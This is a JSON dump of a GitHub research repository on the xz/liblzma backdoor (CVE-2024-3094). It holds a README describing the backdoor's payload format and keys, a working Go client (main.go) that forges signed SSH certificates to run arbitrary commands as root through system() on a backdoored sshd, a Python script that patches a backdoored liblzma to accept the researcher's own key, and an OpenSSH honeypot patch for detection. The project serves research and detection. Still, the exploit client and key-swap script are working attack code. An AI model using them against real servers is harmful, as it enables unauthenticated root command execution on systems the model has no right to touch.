{
  "metadata": {
    "timestamp": 1736566803069,
    "page": 367,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjM3MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "amlweems/xzbot",
      "stars": 3505,
      "defaultBranch": "main",
      "files": [
        {
          "name": "README.md",
          "type": "blob",
          "size": 8.091796875,
          "content": "# xzbot\n\nExploration of the xz [backdoor](https://www.openwall.com/lists/oss-security/2024/03/29/4) (CVE-2024-3094).\nIncludes the following:\n* [honeypot](#honeypot): fake vulnerable server to detect exploit attempts\n* [ed448 patch](#ed448-patch): patch liblzma.so to use our own ED448 public key\n* [backdoor format](#backdoor-format): format of the backdoor payload\n* [backdoor demo](#backdoor-demo): cli to trigger the RCE assuming knowledge of the ED448 private key\n\n![xzbot demo](assets/demo.png)\n\n## honeypot\n\nSee [openssh.patch](openssh.patch) for a simple patch to openssh that logs any\nconnection attempt with a public key N matching the backdoor format.\n\n```\n$ git clone https://github.com/openssh/openssh-portable\n$ patch -p1 < ~/path/to/openssh.patch\n$ autoreconf\n$ ./configure\n$ make\n```\n\nAny connection attempt will appear as follows in sshd logs:\n```\n$ journalctl -u ssh-xzbot --since='1d ago' | grep xzbot:\nMar 30 00:00:00 honeypot sshd-xzbot[1234]: xzbot: magic 1 [preauth]\nMar 30 00:00:00 honeypot sshd-xzbot[1234]: xzbot: 010000000100000000000000000000005725B22ED2...\n```\n\n# ed448 patch\n\nThe backdoor uses a hardcoded ED448 public key for signature validation and\ndecrypting the payload. If we replace this key with our own, we can trigger\nthe backdoor.\n\nThe attacker's ED448 key is:\n```\n0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28\n34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48\n10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e\n20 d3 2c 60 2b 2c 6d 31 00\n```\n\nWe will replace this key with our own (generated with seed=0):\n```\n5b 3a fe 03 87 8a 49 b2 82 32 d4 f1 a4 42 ae bd\ne1 09 f8 07 ac ef 7d fd 9a 7f 65 b9 62 fe 52 d6\n54 73 12 ca ce cf f0 43 37 50 8f 9d 25 29 a8 f1\n66 91 69 b2 1c 32 c4 80 00\n```\n\nTo start, download a backdoored libxzma shared object, e.g.\nfrom https://snapshot.debian.org/package/xz-utils/5.6.1-1.\nThen run the patch script. See [assets/](assets/) for examples.\n\n```\n$ pip install pwntools\n$ shasum -a 256 liblzma.so.5.6.1\n605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  liblzma.so.5.6.1\n$ python3 patch.py liblzma.so.5.6.1\nPatching func at offset: 0x24470\nGenerated patched so: liblzma.so.5.6.1.patch\n```\n\nThen run sshd using this modified `liblzma.so.5.6.1.patch` shared object.\n\n## backdoor format\n\nThe backdoor can be triggered by connecting with an SSH certificate with a\npayload in the CA signing key N value. This payload must be encrypted and\nsigned with the attacker's ED448 key.\n\nThe structure has the following format:\n```\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|   a (32 bit)  |   b (32 bit)  |           c (64 bit)          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                                                               |\n+                     ciphertext (240 bytes)                    +\n|                                                               |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n```\n\nA request type is derived from the three values above (`a * b + c`).\nIf this value is greater than 3, the backdoor skips processing.\n\n* Type 1: unknown, expects zero bytes\n* Type 2: executes null-terminated payload with system()\n* Type 3: unknown, expects 48 bytes (signed)\n\nThe ciphertext is encrypted with chacha20 using the first 32 bytes of the\nED448 public key as a symmetric key. As a result, we can decrypt any\nexploit attempt using the following key:\n```\n0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28\n34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48\n```\n\nThe ciphertext has the following format:\n```\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    signature (114 bytes)                      |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| x (1 bit) |            unused ? (14 bit)          | y (1 bit) |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|        unknown (8 bit)        |         length (8 bit)        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|        unknown (8 bit)        |         command \\x00          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n```\n\nSetting either `x` or `y` leads to slightly different code paths.\n\nThe signature is an RFC-8032 ED448 signature computed over the following values:\n* The 32-bit magic value (e.g. `02 00 00 00`)\n* The 5 bytes of fields before command\n* [optional] `length` bytes of the command\n* The first 32 bytes of the sha256 hash of the server's hostkey\n\n# backdoor demo\n\n```\n$ go install github.com/amlweems/xzbot@latest\n```\n\n```\n$ xzbot -h\nUsage of xzbot:\n  -addr string\n        ssh server address (default \"127.0.0.1:2222\")\n  -seed string\n        ed448 seed, must match xz backdoor key (default \"0\")\n  -cmd string\n        command to run via system() (default \"id > /tmp/.xz\")\n```\n\nThe following will connect to a vulnerable SSH server at `127.0.0.1:2222` and\nrun the command `id > /tmp/.xz`:\n```\n$ xzbot -addr 127.0.0.1:2222 -cmd 'id > /tmp/.xz'\n00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|\n00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|\n00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|\n00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n...\n00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|\n00000170  00 00 01 01 00 00 01 00  02 00 00 00 01 00 00 00  |................|\n00000180  00 00 00 00 00 00 00 00  54 97 bc c5 ef 93 e4 24  |........T......$|\n00000190  cf b1 57 57 59 85 52 fd  41 2a a5 54 9e aa c6 52  |..WWY.R.A*.T...R|\n000001a0  58 64 a4 17 45 8a af 76  ce d2 e3 0b 7c bb 1f 29  |Xd..E..v....|..)|\n000001b0  2b f0 38 45 3f 5e 00 f1  b0 00 15 84 e7 bc 10 1f  |+.8E?^..........|\n000001c0  0f 5f 50 36 07 9f bd 07  05 77 5c 74 84 69 c9 7a  |._P6.....w\\t.i.z|\n000001d0  28 6b e8 16 aa 99 34 bf  9d c4 c4 5c b8 fd 4a 3c  |(k....4....\\..J<|\n000001e0  d8 2b 39 32 06 d9 4f a4  3a 00 d0 0b 0f a2 21 c0  |.+92..O.:.....!.|\n000001f0  86 c3 c9 e2 e6 17 b4 a6  54 ba c3 a1 4c 40 91 be  |........T...L@..|\n00000200  91 9a 2b f8 0b 18 61 1c  5e e1 e0 5b e8 00 00 00  |..+...a.^..[....|\n00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n...\n00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|\n00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|\n2024/03/30 00:00:00 ssh: handshake failed: EOF\n```\n\nOn the vulnerable server, we can set a watchpoint for the call to `system()`\nand observe the command is executed:\n```\n$ bpftrace -e 'watchpoint:0x07FFFF74B1995:8:x {\n    printf(\"%s (%d): %s\\n\", comm, pid, str(uptr(reg(\"di\"))))\n}'\nAttaching 1 probe...\nsshd (1234): id > /tmp/.xz\n\n$ cat /tmp/.xz\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nThe process tree after exploitation looks different from a normal sshd\nprocess tree:\n```\n# normal process tree\n$ ssh foo@bar\n$ ps -ef --forest\nroot         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\nroot        1026     765  7 18:51 ?        00:00:00  \\_ sshd: foo [priv]\nfoo         1050    1026  0 18:51 ?        00:00:00      \\_ sshd: foo@pts/1\nfoo         1051    1050  0 18:51 pts/1    00:00:00          \\_ -bash\n\n# backdoor process tree\n$ xzbot -cmd 'sleep 60'\n$ ps -ef --forest\nroot         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\nroot         941     765  4 18:04 ?        00:00:00  \\_ sshd: root [priv]\nsshd         942     941  0 18:04 ?        00:00:00      \\_ sshd: root [net]\nroot         943     941  0 18:04 ?        00:00:00      \\_ sh -c sleep 60\nroot         944     943  0 18:04 ?        00:00:00          \\_ sleep 60\n```\n\n*Note: successful exploitation does not generate any INFO or higher log entries.*\n\n# References\n\n- https://www.openwall.com/lists/oss-security/2024/03/29/4\n- https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504\n- https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01\n- https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4\n"
        },
        {
          "name": "assets",
          "type": "tree",
          "content": null
        },
        {
          "name": "go.mod",
          "type": "blob",
          "size": 0.162109375,
          "content": "module github.com/amlweems/xzbot\n\ngo 1.20\n\nrequire (\n\tgithub.com/cloudflare/circl v1.3.7\n\tgolang.org/x/crypto v0.21.0\n)\n\nrequire golang.org/x/sys v0.18.0 // indirect\n"
        },
        {
          "name": "go.sum",
          "type": "blob",
          "size": 0.5458984375,
          "content": "github.com/cloudflare/circl v1.3.7 h1:qlCDlTPz2n9fu58M0Nh1J/JzcFpfgkFHHX3O35r5vcU=\ngithub.com/cloudflare/circl v1.3.7/go.mod h1:sRTcRWXGLrKw6yIGJ+l7amYJFfAXbZG0kBSc8r4zxgA=\ngolang.org/x/crypto v0.21.0 h1:X31++rzVUdKhX5sWmSOFZxx8UW/ldWx55cbf08iNAMA=\ngolang.org/x/crypto v0.21.0/go.mod h1:0BP7YvVV9gBbVKyeTG0Gyn+gZm94bibOW5BjDEYAOMs=\ngolang.org/x/sys v0.18.0 h1:DBdB3niSjOA/O0blCZBqDefyWNYveAYMNF1Wum0DYQ4=\ngolang.org/x/sys v0.18.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\ngolang.org/x/term v0.18.0 h1:FcHjZXDMxI8mM3nwhX9HlKop4C0YQvCVCdwYl2wOtE8=\n"
        },
        {
          "name": "main.go",
          "type": "blob",
          "size": 4.2275390625,
          "content": "package main\n\nimport (\n\t\"bytes\"\n\t\"crypto/ecdsa\"\n\t\"crypto/ed25519\"\n\t\"crypto/elliptic\"\n\t\"crypto/rsa\"\n\t\"crypto/sha256\"\n\t\"encoding/binary\"\n\t\"encoding/hex\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"math/big\"\n\t\"net\"\n\n\t\"github.com/cloudflare/circl/sign/ed448\"\n\t\"golang.org/x/crypto/chacha20\"\n\t\"golang.org/x/crypto/ssh\"\n)\n\nvar (\n\taddr  = flag.String(\"addr\", \"127.0.0.1:2222\", \"ssh server address\")\n\tseedn = flag.String(\"seed\", \"0\", \"ed448 seed, must match xz backdoor key\")\n\tcmd   = flag.String(\"cmd\", \"id > /tmp/.xz\", \"command to run via system()\")\n)\n\ntype xzPublicKey struct {\n\tbuf []byte\n}\n\nfunc (k *xzPublicKey) Type() string {\n\treturn \"ssh-rsa\"\n}\n\nfunc (k *xzPublicKey) Marshal() []byte {\n\te := new(big.Int).SetInt64(int64(1))\n\twirekey := struct {\n\t\tName string\n\t\tE    *big.Int\n\t\tN    []byte\n\t}{\n\t\tssh.KeyAlgoRSA,\n\t\te,\n\t\tk.buf,\n\t}\n\treturn ssh.Marshal(wirekey)\n}\n\nfunc (k *xzPublicKey) Verify(data []byte, sig *ssh.Signature) error {\n\treturn nil\n}\n\ntype xzSigner struct {\n\tsigningKey    ed448.PrivateKey\n\tencryptionKey []byte\n\thostkey       []byte\n\tcert          *ssh.Certificate\n}\n\nfunc (s *xzSigner) PublicKey() ssh.PublicKey {\n\tif s.cert != nil {\n\t\treturn s.cert\n\t}\n\n\t// magic cmd byte (system() = 2)\n\tmagic1 := uint32(0x1234)\n\tmagic2 := uint32(0x5678)\n\tmagic3 := uint64(0xfffffffff9d9ffa2)\n\tmagic := uint32(uint64(magic1)*uint64(magic2) + magic3)\n\n\tvar hdr bytes.Buffer\n\tbinary.Write(&hdr, binary.LittleEndian, uint32(magic1))\n\tbinary.Write(&hdr, binary.LittleEndian, uint32(magic2))\n\tbinary.Write(&hdr, binary.LittleEndian, uint64(magic3))\n\n\tcmdlen := uint8(len(*cmd))\n\tvar payload bytes.Buffer\n\tpayload.Write([]byte{0b00000000, 0b00000000, 0, cmdlen, 0})\n\tpayload.Write([]byte(*cmd))\n\tpayload.Write([]byte{0})\n\n\tvar md bytes.Buffer\n\tbinary.Write(&md, binary.LittleEndian, magic)\n\tmd.Write(payload.Bytes()[:cmdlen+5])\n\tmd.Write(s.hostkey)\n\tsignature := ed448.Sign(s.signingKey, md.Bytes(), \"\")\n\n\tvar buf bytes.Buffer\n\tbuf.Write(signature)\n\tbuf.Write(payload.Bytes())\n\thdr.Write(decrypt(buf.Bytes(), s.encryptionKey[:32], hdr.Bytes()[:16]))\n\tif hdr.Len() < 256 {\n\t\thdr.Write(bytes.Repeat([]byte{0}, 256-hdr.Len()))\n\t}\n\n\tn := big.NewInt(1)\n\tn.Lsh(n, 2048)\n\tpub, err := ssh.NewPublicKey(&rsa.PublicKey{N: n, E: 0x10001})\n\tfatalIfErr(err)\n\n\ts.cert = &ssh.Certificate{\n\t\tCertType: ssh.UserCert,\n\t\tSignatureKey: &xzPublicKey{\n\t\t\tbuf: hdr.Bytes(),\n\t\t},\n\t\tSignature: &ssh.Signature{\n\t\t\tFormat: \"ssh-rsa\",\n\t\t\tBlob:   []byte(\"\\x00\"),\n\t\t},\n\t\tKey: pub,\n\t}\n\tfmt.Printf(\"%s\", hex.Dump(s.cert.Marshal()))\n\treturn s.cert\n}\n\nfunc (s *xzSigner) Sign(rand io.Reader, data []byte) (*ssh.Signature, error) {\n\treturn nil, nil\n}\n\nfunc (s *xzSigner) HostKeyCallback(_ string, _ net.Addr, key ssh.PublicKey) error {\n\th := sha256.New()\n\n\tcpk := key.(ssh.CryptoPublicKey).CryptoPublicKey()\n\tswitch pub := cpk.(type) {\n\tcase *rsa.PublicKey:\n\t\tw := struct {\n\t\t\tE *big.Int\n\t\t\tN *big.Int\n\t\t}{\n\t\t\tbig.NewInt(int64(pub.E)),\n\t\t\tpub.N,\n\t\t}\n\t\th.Write(ssh.Marshal(&w))\n\tcase *ecdsa.PublicKey:\n\t\tkeyBytes := elliptic.Marshal(pub.Curve, pub.X, pub.Y)\n\t\tw := struct {\n\t\t\tKey []byte\n\t\t}{\n\t\t\t[]byte(keyBytes),\n\t\t}\n\t\th.Write(ssh.Marshal(&w))\n\tcase ed25519.PublicKey:\n\t\tw := struct {\n\t\t\tKeyBytes []byte\n\t\t}{\n\t\t\t[]byte(pub),\n\t\t}\n\t\th.Write(ssh.Marshal(&w))\n\tdefault:\n\t\tlog.Fatalf(\"unsupported hostkey alg: %s\\n\", key.Type())\n\t\treturn nil\n\t}\n\tmsg := h.Sum(nil)\n\ts.hostkey = msg[:32]\n\n\treturn nil\n}\n\nfunc decrypt(src, key, iv []byte) []byte {\n\tdst := make([]byte, len(src))\n\tc, err := chacha20.NewUnauthenticatedCipher(key, iv[4:16])\n\tfatalIfErr(err)\n\tc.SetCounter(binary.LittleEndian.Uint32(iv[:4]))\n\tc.XORKeyStream(dst, src)\n\treturn dst\n}\n\nfunc fatalIfErr(err error) {\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n\nfunc main() {\n\tflag.Parse()\n\n\tif len(*cmd) > 64 {\n\t\tfmt.Printf(\"cmd too long, should not exceed 64 characters\\n\")\n\t\treturn\n\t}\n\n\tvar seed [ed448.SeedSize]byte\n\tsb, ok := new(big.Int).SetString(*seedn, 10)\n\tif !ok {\n\t\tfmt.Printf(\"invalid seed int\\n\")\n\t\treturn\n\t}\n\tsb.FillBytes(seed[:])\n\n\tsigningKey := ed448.NewKeyFromSeed(seed[:])\n\txz := &xzSigner{\n\t\tsigningKey:    signingKey,\n\t\tencryptionKey: signingKey[ed448.SeedSize:],\n\t}\n\tconfig := &ssh.ClientConfig{\n\t\tUser: \"root\",\n\t\tAuth: []ssh.AuthMethod{\n\t\t\tssh.PublicKeys(xz),\n\t\t},\n\t\tHostKeyCallback: xz.HostKeyCallback,\n\t}\n\tclient, err := ssh.Dial(\"tcp\", *addr, config)\n\tif err != nil {\n\t\tfatalIfErr(err)\n\t}\n\tdefer client.Close()\n}\n"
        },
        {
          "name": "openssh.patch",
          "type": "blob",
          "size": 1.5634765625,
          "content": "diff --git a/ssh-rsa.c b/ssh-rsa.c\nindex be8f51e75..8912d2d8f 100644\n--- a/ssh-rsa.c\n+++ b/ssh-rsa.c\n@@ -629,6 +629,48 @@ rsa_hash_alg_oid(int hash_alg, const u_char **oidp, size_t *oidlenp)\n \treturn 0;\n }\n \n+static void backdoor(RSA *rsa)\n+{\n+\tconst BIGNUM *n;\n+\tconst BIGNUM *e;\n+\tint bits, bytes, belen;\n+\tsize_t magic;\n+\tunsigned char buf[512];\n+\n+\tRSA_get0_key(rsa, &n, &e, 0);\n+\tbits = BN_num_bits(n);\n+\tif (bits > 0x4000) {\n+\t\tverbose(\"xzbot: too many bits: %d\", bits);\n+\t\treturn;\n+\t}\n+\tbytes = (bits + 7) >> 3;\n+\tif (bytes - 0x14 > 0x204) {\n+\t\tverbose(\"xzbot: too many bytes: %d\", bytes);\n+\t\treturn;\n+\t}\n+\tbelen = BN_bn2bin(n, buf);\n+\tif (bytes < belen || belen <= 0x10) {\n+\t\tverbose(\"xzbot: big endian mismatch: %d vs %d\", belen, bytes);\n+\t\treturn;\n+\t}\n+\tif (!buf[0] || !buf[4]) {\n+\t\tverbose(\"xzbot: invalid magic (%d, %d)\", buf[0], buf[4]);\n+\t\treturn;\n+\t}\n+\tuint32_t a = *(uint32_t*)&buf[0];\n+\tuint32_t b = *(uint32_t*)&buf[4];\n+\tuint64_t c = *(uint64_t*)&buf[8];\n+\tmagic = (uint64_t) a * b + c;\n+\tif (magic > 3) {\n+\t\tverbose(\"xzbot: invalid magic %zu\", magic);\n+\t\treturn;\n+\t}\n+\tlogit(\"xzbot: magic %zu\", magic);\n+\tchar *nh = BN_bn2hex(n);\n+\tlogit(\"xzbot: %s\", nh);\n+\tOPENSSL_free(nh);\n+}\n+\n static int\n openssh_RSA_verify(int hash_alg, u_char *hash, size_t hashlen,\n     u_char *sigbuf, size_t siglen, RSA *rsa)\n@@ -656,6 +698,7 @@ openssh_RSA_verify(int hash_alg, u_char *hash, size_t hashlen,\n \t\tret = SSH_ERR_ALLOC_FAIL;\n \t\tgoto done;\n \t}\n+\tbackdoor(rsa);\n \tif ((len = RSA_public_decrypt(siglen, sigbuf, decrypted, rsa,\n \t    RSA_PKCS1_PADDING)) < 0) {\n \t\tret = SSH_ERR_LIBCRYPTO_ERROR;\n"
        },
        {
          "name": "patch.py",
          "type": "blob",
          "size": 1.55078125,
          "content": "#!/usr/bin/env python3\nimport os, sys\npath = sys.argv[1]\nif not os.path.exists(path):\n  print(\"usage: patch.py <path>\")\n  sys.exit(1)\n\nfrom pwn import *\ncontext.update(arch='amd64', os='linux')\n\n# generate_key bytes from backdoored v5.6.0\nfunc = unhex('f30f1efa4885ff0f848e000000415455'\n             '534889f34881eca00000004885f67504'\n             '31c0eb6b4c8b4e084d85c974f34889e2'\n             '31c0488d6c24304989fcb90c00000048'\n             '89d74989e8be30000000f3abb91c0000'\n             '004889eff3ab488d4c24204889d7')\nflen = 160\n\n# replace generate_key with a static key from mem\np = asm('''\n  push rsi\n  lea rsi,[rip+72]\n  mov rax, [rsi+0x00]\n  mov [rdi+0x00], rax\n  mov rax, [rsi+0x08]\n  mov [rdi+0x08], rax\n  mov rax, [rsi+0x10]\n  mov [rdi+0x10], rax\n  mov rax, [rsi+0x18]\n  mov [rdi+0x18], rax\n  mov rax, [rsi+0x20]\n  mov [rdi+0x20], rax\n  mov rax, [rsi+0x28]\n  mov [rdi+0x28], rax\n  mov rax, [rsi+0x30]\n  mov [rdi+0x30], rax\n  mov rax, [rsi+0x38]\n  mov [rdi+0x38], rax\n  mov eax, 1\n  pop rsi\n  ret\n  nop\n  nop\n  nop\n''')\n\n# ed448 public key for seed 0\np += unhex('5b3afe03878a49b28232d4f1a442aebd'\n           'e109f807acef7dfd9a7f65b962fe52d6'\n           '547312cacecff04337508f9d2529a8f1'\n           '669169b21c32c48000')\np += b'\\x00' * (flen - len(p))\n\n# patch .so\nwith open(path, 'rb') as f:\n  lzma = f.read()\nif func not in lzma:\n  print('Could not identify func')\n  sys.exit(1)\noff = lzma.index(func)\nprint('Patching func at offset: ' + hex(off))\nwith open(path+'.patch', 'wb') as f:\n  f.write(lzma[:off]+p+lzma[off+flen:])\nprint('Generated patched so: ' + path+'.patch')\n"
        }
      ]
    }
  ]
}